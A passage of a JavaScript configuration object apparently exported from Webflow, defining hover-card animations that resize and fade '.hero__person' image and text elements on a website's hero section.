      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-more.mod--4",
      //               selectorGuids: [
      //                 "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
      //                 "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
      //               ],
      //             },
      //             value: 0,
      //             unit: "",
      //           },
      //         },
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
      //         {
      //           id: "a-4-n-5",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-less.mod--2",
      //               selectorGuids: [
      //                 "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
      //                 "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
      //               ],
      //             },
      //             value: 1,
      //             unit: "",
      //           },
      //         },
    
    
    
    
    
    
    
    
    
    
      //         {
      //           id: "a-4-n-5",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-less.mod--4",
      //               selectorGuids: [
      //                 "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
      //                 "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
      //               ],
      //             },
      //             value: 1,
      //             unit: "",
      //           },
      //         },
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
      //         {
      //           id: "a-4-n-6",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-less.mod--1",
      //               selectorGuids: [
      //                 "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
      //                 "456ce75b-43f2-3c4c-7973-64ea84fa562f",
      //               ],
      //             },
      //             value: 1,
      //             unit: "",
      //           },
      //         },
      //         {
      //           id: "a-4-n-7",
      //           actionTypeId: "STYLE_OPACITY",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 300,
      //             target: {
      //               selector: ".hero__person-txt-more.mod--1",
      //               selectorGuids: [
      //                 "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
      //                 "94d52b28-bdbe-ce3f-22fa-c3c356622361",
      //               ],
      //             },
      //             value: 0,
      //             unit: "",
      //           },
      //         },
      //         {
      //           id: "a-4-n-8",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person.mod--1",
      //               selectorGuids: [
      //                 "937b4a30-5db7-d9b4-8412-213b3e33edef",
      //                 "2ed536ab-ab43-210d-3338-2715ea151af7",
      //               ],
      //             },
      //             widthValue: 21,
      //             widthUnit: "%",
      //             heightUnit: "PX",
      //             locked: !1,
      //           },
      //         },
      //         {
      //           id: "a-4-n-9",
      //           actionTypeId: "STYLE_SIZE",
      //           config: {
      //             delay: 0,
      //             easing: "ease",
      //             duration: 500,
      //             target: {
      //               selector: ".hero__person.mod--3",
      //               selectorGuids: [
      //                 "937b4a30-5db7-d9b4-8412-213b3e33edef",
      //                 "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
      //               ],
      //             },
      //             widthValue: 58,
      //             widthUnit: "%",
      //             heightUnit: "PX",
      //             locked: !1,
      //           },
      //         },
      //       ],
      //     },
      //   ],
      //   useFirstGroupAsInitialState: !1,
      //   createdOn: 1635972718397,
      // },


      "a-4": {
        id: "a-4",
        title: "card 3",
        actionItemGroups: [
          {
            actionItems: [
    
    
              {
                id: "a-4-n",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--3",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
    
    
    
    
    
    
    
    
              {
                id: "a-4-n",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--2",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-4-n-12",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--1",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "36648068-e0c7-a091-11cd-21efa1e922cd",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-4-n-11",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--2",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
    
    
    
    
    
    
              {
                id: "a-4-n-11",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--3",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
              {
                id: "a-4-n-10",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--4",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 115,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-4-n-2",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--4",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-4-n-3",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--4",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-4-n-4",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--2",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
    
    
    
    
    
    
    
              {
                id: "a-4-n-4",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--3",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
              {
                id: "a-4-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--2",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
    
    
    
    
    
    
    
    
    
    
              {
                id: "a-4-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--3",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
              {
                id: "a-4-n-6",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--1",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "456ce75b-43f2-3c4c-7973-64ea84fa562f",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-4-n-7",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--1",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "94d52b28-bdbe-ce3f-22fa-c3c356622361",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-4-n-8",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--1",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "2ed536ab-ab43-210d-3338-2715ea151af7",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-4-n-9",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--4",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 58,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !1,
        createdOn: 1635972718397,
      },











































      "a-9": {
        id: "a-9",
        title: "card 3",
        actionItemGroups: [
          {
            actionItems: [


              {
                id: "a-9-n",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--4",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },








              {
                id: "a-9-n",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--2",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-9-n-12",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--1",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "36648068-e0c7-a091-11cd-21efa1e922cd",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-9-n-11",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--2",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },






              {
                id: "a-9-n-11",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--4",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
















              {
                id: "a-9-n-10",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--3",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 115,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-9-n-2",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--3",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-9-n-3",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--3",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-9-n-4",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--2",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },







              {
                id: "a-9-n-4",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--4",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },



















              {
                id: "a-9-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--2",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },










              {
                id: "a-9-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--4",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },






















              {
                id: "a-9-n-6",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--1",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "456ce75b-43f2-3c4c-7973-64ea84fa562f",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-9-n-7",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--1",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "94d52b28-bdbe-ce3f-22fa-c3c356622361",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-9-n-8",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--1",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "2ed536ab-ab43-210d-3338-2715ea151af7",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-9-n-9",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--3",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 58,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !1,
        createdOn: 1635972718397,
      },
      "a-8": {
        id: "a-8",
        title: "card 2",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-8-n-4",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--2",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 58,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-8-n-15",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--1",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "36648068-e0c7-a091-11cd-21efa1e922cd",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-8-n-14",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--3",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },



              {
                id: "a-8-n-14",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--4",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },










              {
                id: "a-8-n-13",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--2",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 115,
                  widthUnit: "%",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-8-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--3",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },





              {
                id: "a-8-n-5",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--4",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },












              {
                id: "a-8-n-6",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--3",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },






              {
                id: "a-8-n-6",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--4",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },










              {
                id: "a-8-n-7",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--2",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-8-n-8",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--2",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-8-n-9",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--1",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "456ce75b-43f2-3c4c-7973-64ea84fa562f",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
                id: "a-8-n-10",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--1",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "94d52b28-bdbe-ce3f-22fa-c3c356622361",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-8-n-11",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--1",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "2ed536ab-ab43-210d-3338-2715ea151af7",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-8-n-12",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--3",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },












              {
                id: "a-8-n-12",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--4",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "3ffc0fa8-b069-cc08-07ae-5786e7381e41",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
            ],
          },
        ],
        useFirstGroupAsInitialState: !1,
        createdOn: 1635972718397,
      },
      "a-10": {
        id: "a-10",
        title: "card 4",
        actionItemGroups: [
          {
            actionItems: [
              {
                id: "a-10-n-8",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person.mod--2",
                    selectorGuids: [
                      "937b4a30-5db7-d9b4-8412-213b3e33edef",
                      "e7e643d0-961d-facd-9cb0-dcde8ef0d288",
                    ],
                  },
                  widthValue: 21,
                  widthUnit: "%",
                  heightUnit: "PX",
                  locked: !1,
                },
              },
              {
                id: "a-10-n-19",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--3",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },



              {
                id: "a-10-n-19",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--4",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "98ce4a57-4643-1820-a97a-cdbdc8e91dfb",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },









              {
                id: "a-10-n-18",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--2",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "fd64154a-e0dd-9461-f424-47c91112c834",
                    ],
                  },
                  heightValue: 100,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-10-n-17",
                actionTypeId: "STYLE_SIZE",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 500,
                  target: {
                    selector: ".hero__person-img.mod--1",
                    selectorGuids: [
                      "e514cb96-ca68-e414-1212-96ee69ec1bae",
                      "36648068-e0c7-a091-11cd-21efa1e922cd",
                    ],
                  },
                  heightValue: 115,
                  widthUnit: "PX",
                  heightUnit: "%",
                  locked: !1,
                },
              },
              {
                id: "a-10-n-9",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--3",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },




              {
                id: "a-10-n-9",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--4",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "013700ce-17bf-936e-69b1-06f8c72ec5dd",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },











              {
                id: "a-10-n-10",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--3",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },





              {
                id: "a-10-n-10",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--4",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "231cb3e2-bdc8-21c7-44b9-b06c464fde0b",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },











              {
                id: "a-10-n-11",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-more.mod--2",
                    selectorGuids: [
                      "13aa3a19-fa4d-fd90-d0c1-fa087c1cf347",
                      "b25361c5-e7fa-ef48-1dcd-caacef4a25c6",
                    ],
                  },
                  value: 0,
                  unit: "",
                },
              },
              {
                id: "a-10-n-12",
                actionTypeId: "STYLE_OPACITY",
                config: {
                  delay: 0,
                  easing: "ease",
                  duration: 300,
                  target: {
                    selector: ".hero__person-txt-less.mod--2",
                    selectorGuids: [
                      "a1d469c5-1ab9-bb35-2b55-9209cec6a135",
                      "630ec1b8-e16c-77c5-25f6-0df79b1c490a",
                    ],
                  },
                  value: 1,
                  unit: "",
                },
              },
              {
